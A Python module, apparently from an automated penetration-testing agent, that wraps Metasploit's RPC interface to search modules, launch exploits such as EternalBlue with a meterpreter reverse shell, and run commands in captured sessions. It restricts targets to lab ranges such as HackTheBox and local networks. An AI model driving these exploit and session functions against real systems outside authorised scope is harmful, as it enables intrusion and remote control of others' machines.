"""Metasploit RPC client wrapper for the Exploit Agent.

Provides a high-level, privacy-aware interface to the Metasploit
Framework via its MSGRPC daemon, using pymetasploit3 under the hood.
All exploit execution is gated by ALLOWED_TARGET_RANGES validation.
"""

from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from ipaddress import ip_address, ip_network
from typing import Any

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Target-scope enforcement
# ---------------------------------------------------------------------------
ALLOWED_TARGET_RANGES: list[str] = [
    "10.10.0.0/16",       # HackTheBox VPN range
    "10.129.0.0/16",      # HackTheBox VPN range (alternate)
    "192.168.56.0/24",    # Local VirtualBox host-only
    "172.17.0.0/16",      # Docker containers
    "127.0.0.1/32",       # Localhost
]


def validate_target(ip: str) -> bool:
    """Reject any target not in allowed ranges. No exceptions.

    Args:
        ip: IPv4 address string to validate.

    Returns:
        True if *ip* falls within an authorised range.
    """
    try:
        addr = ip_address(ip)
    except ValueError:
        logger.error(f"Invalid IP address format: {ip}")
        return False
    return any(
        addr in ip_network(net, strict=False)
        for net in ALLOWED_TARGET_RANGES
    )


# ---------------------------------------------------------------------------
# Custom exceptions
# ---------------------------------------------------------------------------
class MetasploitRPCError(Exception):
    """Base exception for Metasploit RPC operations."""


class MetasploitConnectionError(MetasploitRPCError):
    """Raised when the RPC daemon cannot be reached."""


class MetasploitModuleError(MetasploitRPCError):
    """Raised when a module cannot be found or execution fails."""


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------
@dataclass
class MsfModule:
    """Describes a single Metasploit module."""

    name: str
    full_path: str
    description: str
    rank: str
    references: list[str]


@dataclass
class ExploitOptions:
    """Configuration for an exploit execution attempt."""

    rhosts: str
    rport: int
    payload: str
    lhost: str = "0.0.0.0"
    lport: int = 4444
    extra_options: dict[str, str] = field(default_factory=dict)


@dataclass
class ExploitExecutionResult:
    """Outcome of an exploit execution attempt."""

    success: bool
    session_id: int | None
    module_used: str
    target: str
    error_message: str = ""
    raw_output: str = ""


@dataclass
class SessionInfo:
    """Metadata for an active Metasploit session."""

    session_id: int
    session_type: str
    target_host: str
    username: str
    platform: str
    via_exploit: str


# ---------------------------------------------------------------------------
# RPC Client
# ---------------------------------------------------------------------------
class MetasploitRPCClient:
    """High-level, safety-gated wrapper around pymetasploit3's MsfRpcClient.

    Usage::

        with MetasploitRPCClient(password="secret") as msf:
            modules = msf.search_modules("eternalblue")
            result  = msf.execute_exploit(
                "exploit/windows/smb/ms17_010_eternalblue",
                ExploitOptions(
                    rhosts="10.10.10.40",
                    rport=445,
                    payload="windows/x64/meterpreter/reverse_tcp",
                ),
            )
    """

    def __init__(
        self,
        host: str = "127.0.0.1",
        port: int = 55553,
        password: str = "",
        ssl: bool = True,
    ) -> None:
        """Store connection parameters without connecting.

        Args:
            host: Address of the msfrpcd daemon.
            port: TCP port of the msfrpcd daemon.
            password: Authentication password for msfrpcd.
            ssl: Whether to use SSL/TLS for the connection.
        """
        self._host = host
        self._port = port
        self._password = password
        self._ssl = ssl
        self._client: Any | None = None
        logger.debug(
            f"MetasploitRPCClient configured for "
            f"{host}:{port} (ssl={ssl})"
        )

    # -- context manager ----------------------------------------------------

    def __enter__(self) -> MetasploitRPCClient:
        """Connect on entering context manager."""
        self.connect()
        return self

    def __exit__(
        self,
        exc_type: type[BaseException] | None,
        exc_val: BaseException | None,
        exc_tb: Any | None,
    ) -> None:
        """Disconnect on exiting context manager."""
        self.disconnect()

    # -- connection lifecycle -----------------------------------------------

    def connect(self) -> bool:
        """Establish a connection to the Metasploit RPC daemon.

        Returns:
            True when the connection succeeds.

        Raises:
            MetasploitConnectionError: If the daemon is unreachable.
        """
        try:
            from pymetasploit3.msfrpc import MsfRpcClient  # noqa: WPS433

            self._client = MsfRpcClient(
                self._password,
                server=self._host,
                port=self._port,
                ssl=self._ssl,
            )
            logger.info(
                f"Connected to msfrpcd at "
                f"{self._host}:{self._port}"
            )
            return True
        except ImportError as exc:
            raise MetasploitConnectionError(
                "pymetasploit3 is not installed"
            ) from exc
        except (ConnectionError, OSError) as exc:
            logger.error(
                f"Failed to connect to msfrpcd at "
                f"{self._host}:{self._port}: {exc}"
            )
            raise MetasploitConnectionError(
                f"Cannot reach msfrpcd at "
                f"{self._host}:{self._port}"
            ) from exc

    def disconnect(self) -> None:
        """Release the RPC connection and clean up resources."""
        if self._client is not None:
            try:
                self._client.logout()
            except (AttributeError, OSError) as exc:
                logger.debug(
                    f"Non-critical error during disconnect: {exc}"
                )
            finally:
                self._client = None
                logger.info("Disconnected from msfrpcd")

    def is_connected(self) -> bool:
        """Check whether the RPC connection is alive.

        Returns:
            True if there is an active client connection.
        """
        return self._client is not None

    # -- health -------------------------------------------------------------

    def health_check(self) -> bool:
        """Verify the RPC daemon is responsive.

        Returns:
            True when the daemon responds to a version query.
        """
        if not self.is_connected():
            logger.warning("health_check called without connection")
            return False
        try:
            _version = self._client.core.version
            logger.debug(f"msfrpcd health OK: {_version}")
            return True
        except (OSError, AttributeError) as exc:
            logger.error(f"msfrpcd health check failed: {exc}")
            return False

    # -- module operations --------------------------------------------------

    def validate_module_exists(self, module_path: str) -> bool:
        """Check whether *module_path* exists in Metasploit.

        Args:
            module_path: Full module path, e.g.
                ``exploit/windows/smb/ms17_010_eternalblue``.

        Returns:
            True if the module is found.

        Raises:
            MetasploitConnectionError: If not connected.
        """
        self._require_connection()
        try:
            self._client.modules.use("exploit", module_path)
            return True
        except (KeyError, TypeError):
            return False

    def search_modules(
        self,
        query: str,
        module_type: str = "exploit",
    ) -> list[MsfModule]:
        """Search for modules matching *query*.

        Args:
            query: Free-text search string (e.g. ``"eternalblue"``).
            module_type: Module type filter — ``exploit``, ``auxiliary``,
                ``post``, etc.

        Returns:
            A list of matching :class:`MsfModule` objects.

        Raises:
            MetasploitConnectionError: If not connected.
        """
        self._require_connection()
        results: list[MsfModule] = []
        try:
            raw_modules = self._client.modules.search(query)
            for mod in raw_modules:
                mod_type = mod.get("type", "")
                if module_type and mod_type != module_type:
                    continue
                results.append(
                    MsfModule(
                        name=mod.get("name", ""),
                        full_path=mod.get("fullname", ""),
                        description=mod.get(
                            "description", ""
                        ),
                        rank=mod.get("rank", ""),
                        references=mod.get("references", []),
                    )
                )
            logger.info(
                f"Module search for '{query}' returned "
                f"{len(results)} {module_type} result(s)"
            )
        except (OSError, AttributeError) as exc:
            logger.error(f"Module search failed: {exc}")
        return results

    # -- exploit execution --------------------------------------------------

    def execute_exploit(
        self,
        module_path: str,
        options: ExploitOptions,
    ) -> ExploitExecutionResult:
        """Execute an exploit module against the specified target.

        Target validation is enforced **before** any exploit activity.

        Args:
            module_path: Full Metasploit module path.
            options: :class:`ExploitOptions` with target / payload config.

        Returns:
            :class:`ExploitExecutionResult` describing the outcome.

        Raises:
            MetasploitConnectionError: If not connected.
            MetasploitModuleError: If the module does not exist or
                the target is outside allowed ranges.
        """
        self._require_connection()

        # --- target-scope gate ---------------------------------------------
        if not validate_target(options.rhosts):
            msg = (
                f"Target {options.rhosts} is OUTSIDE allowed "
                f"ranges — exploit blocked"
            )
            logger.critical(
                f"SECURITY: {msg}"
            )
            raise MetasploitModuleError(msg)

        # --- module lookup -------------------------------------------------
        try:
            exploit = self._client.modules.use(
                "exploit", module_path
            )
        except (KeyError, TypeError) as exc:
            raise MetasploitModuleError(
                f"Module not found: {module_path}"
            ) from exc

        # --- set options ---------------------------------------------------
        exploit["RHOSTS"] = options.rhosts
        exploit["RPORT"] = options.rport
        exploit["PAYLOAD"] = options.payload
        exploit["LHOST"] = options.lhost
        exploit["LPORT"] = options.lport
        for key, value in options.extra_options.items():
            exploit[key] = value

        logger.warning(
            f"Executing exploit {module_path} against "
            f"{options.rhosts}:{options.rport}"
        )

        # --- fire ----------------------------------------------------------
        start = time.monotonic()
        try:
            result = exploit.execute(payload=options.payload)
            elapsed_ms = (time.monotonic() - start) * 1000
            logger.info(
                f"Exploit execution completed in "
                f"{elapsed_ms:.0f}ms"
            )
        except (OSError, RuntimeError) as exc:
            elapsed_ms = (time.monotonic() - start) * 1000
            logger.error(
                f"Exploit execution failed after "
                f"{elapsed_ms:.0f}ms: {exc}"
            )
            return ExploitExecutionResult(
                success=False,
                session_id=None,
                module_used=module_path,
                target=options.rhosts,
                error_message=str(exc),
            )

        # --- evaluate result -----------------------------------------------
        job_id = result.get("job_id")
        session_id = self._wait_for_session(
            options.rhosts, timeout=30
        )

        if session_id is not None:
            logger.critical(
                f"Exploit SUCCESS — session {session_id} "
                f"on {options.rhosts} via {module_path}"
            )
            return ExploitExecutionResult(
                success=True,
                session_id=session_id,
                module_used=module_path,
                target=options.rhosts,
                raw_output=str(result),
            )

        logger.warning(
            f"Exploit completed (job {job_id}) but no "
            f"session was created on {options.rhosts}"
        )
        return ExploitExecutionResult(
            success=False,
            session_id=None,
            module_used=module_path,
            target=options.rhosts,
            error_message="No session established",
            raw_output=str(result),
        )

    # -- session operations -------------------------------------------------

    def list_sessions(self) -> list[SessionInfo]:
        """List all active Metasploit sessions.

        Returns:
            A list of :class:`SessionInfo` objects.

        Raises:
            MetasploitConnectionError: If not connected.
        """
        self._require_connection()
        sessions: list[SessionInfo] = []
        try:
            raw = self._client.sessions.list
            for sid, info in raw.items():
                sessions.append(
                    SessionInfo(
                        session_id=int(sid),
                        session_type=info.get("type", ""),
                        target_host=info.get(
                            "target_host", ""
                        ),
                        username=info.get("username", ""),
                        platform=info.get("platform", ""),
                        via_exploit=info.get(
                            "via_exploit", ""
                        ),
                    )
                )
            logger.info(
                f"Found {len(sessions)} active session(s)"
            )
        except (OSError, AttributeError) as exc:
            logger.error(f"Failed to list sessions: {exc}")
        return sessions

    def run_session_command(
        self,
        session_id: int,
        command: str,
    ) -> str:
        """Execute a command inside an active session.

        Args:
            session_id: Numeric session identifier.
            command: Shell / meterpreter command to run.

        Returns:
            The command output as a string.

        Raises:
            MetasploitConnectionError: If not connected.
            MetasploitRPCError: On session interaction failure.
        """
        self._require_connection()
        logger.info(
            f"Running command in session {session_id}: "
            f"{command!r}"
        )
        try:
            shell = self._client.sessions.session(
                str(session_id)
            )
            shell.write(command)
            # Short delay for output to arrive
            time.sleep(1)
            output: str = shell.read()
            logger.debug(
                f"Session {session_id} output length: "
                f"{len(output)} chars"
            )
            return output
        except (OSError, KeyError, AttributeError) as exc:
            raise MetasploitRPCError(
                f"Failed to run command in session "
                f"{session_id}: {exc}"
            ) from exc

    # -- private helpers ----------------------------------------------------

    def _require_connection(self) -> None:
        """Raise if the client is not connected."""
        if not self.is_connected():
            raise MetasploitConnectionError(
                "Not connected to msfrpcd — call connect() first"
            )

    def _wait_for_session(
        self,
        target: str,
        timeout: int = 30,
    ) -> int | None:
        """Poll for a new session on *target* up to *timeout* seconds.

        Args:
            target: The target IP to look for.
            timeout: Maximum seconds to wait.

        Returns:
            The session ID, or ``None`` if no session appeared.
        """
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            try:
                raw = self._client.sessions.list
                for sid, info in raw.items():
                    if info.get("target_host") == target:
                        return int(sid)
            except (OSError, AttributeError):
                pass
            time.sleep(2)
        return None
